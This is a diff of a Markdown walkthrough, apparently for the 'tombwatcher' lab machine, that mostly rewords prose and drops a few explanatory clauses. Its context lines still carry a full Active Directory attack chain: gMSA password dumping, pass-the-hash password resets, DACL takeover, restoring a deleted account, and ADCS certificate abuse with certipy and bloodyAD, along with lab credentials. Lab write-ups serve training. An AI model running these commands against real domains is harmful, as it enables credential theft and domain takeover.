@@ -147,7 +147,7 @@ bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u alfred -p basketball 
 
 ### Reading the gMSA Password
 
-Group Managed Service Accounts (gMSAs) store their live password in the `msDS-ManagedPassword` attribute. Only principals listed in the account's `msDS-GroupMSAMembership` are allowed to read it — and `INFRASTRUCTURE` is one of them. Now a member of that group, `alfred` can dump the gMSA `ansible_dev$`'s current credential material:
+Group Managed Service Accounts (gMSAs) store their live password in the `msDS-ManagedPassword` attribute. Only principals listed in the account's `msDS-GroupMSAMembership` are allowed to read it, and `INFRASTRUCTURE` is one of them. Now a member of that group, `alfred` can dump the gMSA `ansible_dev$`'s current credential material:
 
 ```shell
 python3 gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'
@@ -167,7 +167,7 @@ NT hash recovered for `ansible_dev$`.
 
 ### `ForceChangePassword`
 
-The gMSA `ansible_dev$` holds `ForceChangePassword` over `sam`, an extended right that allows setting a brand-new password without knowing the current one. Since only the NT hash is known for the gMSA, the reset is performed with Pass-the-Hash:
+The gMSA `ansible_dev$` holds `ForceChangePassword` over `sam`, an extended right that allows setting a new password without knowing the current one. Since only the NT hash is known for the gMSA, the reset is performed with Pass-the-Hash:
 
 ```shell
 pth-net rpc password "sam" 'newP@ssword2022' \
@@ -205,14 +205,13 @@ impacket-dacledit -action write -rights FullControl -principal sam -target john 
 [*] DACL modified successfully!
 ```
 
-`john`'s password is now reset outright:
+`john`'s password is now reset:
 
 ```shell
 net rpc password "john" "newP@ssword2022" -U "tombwatcher.htb"/"sam"%"newP@ssword2022" -S 10.129.144.23
 ```
 
 ---
-
 ## User Flag
 
 `john` is a member of the Remote Management Users group, granting WinRM access directly:
@@ -277,7 +276,7 @@ OWNER: WRITE
 DACL: WRITE
 ```
 
-The deleted `cert_admin` object's SID (`...-1111`) matches the one granted enrollment rights on `WebServer` — it was the account originally intended to enroll for that template, and its tombstone can be restored because it used to live inside the now-fully-controlled `OU=ADCS`.
+The deleted `cert_admin` object's SID (`...-1111`) matches the one granted enrollment rights on `WebServer` . It was the account originally intended to enroll for that template, and its tombstone can be restored because it used to live inside the now-fully-controlled `OU=ADCS`.
 
 ### Exploitation
 
@@ -292,8 +291,7 @@ bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -
 [+] ...has been restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
 ```
 
-Setting an arbitrary password on the freshly restored account (`GenericAll` on the OU cascades this far too):
-
+Setting an arbitrary password on the restored account:
 ```shell
 bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' \
   set password cert_admin 'Password123!'
@@ -313,7 +311,7 @@ certipy-ad req -u cert_admin -p 'Password123!' -dc-ip 10.129.144.23 \
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
-Using the certificate for Kerberos PKINIT authentication fails — the EKU smuggled into the request is not honored strongly enough for the KDC to issue a TGT:
+Using the certificate for Kerberos PKINIT authentication fails:
 
 ```shell
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.144.23
@@ -341,7 +339,6 @@ Password changed successfully!
 ```
 
 ---
-
 ## Root Flag
 
 ```shell
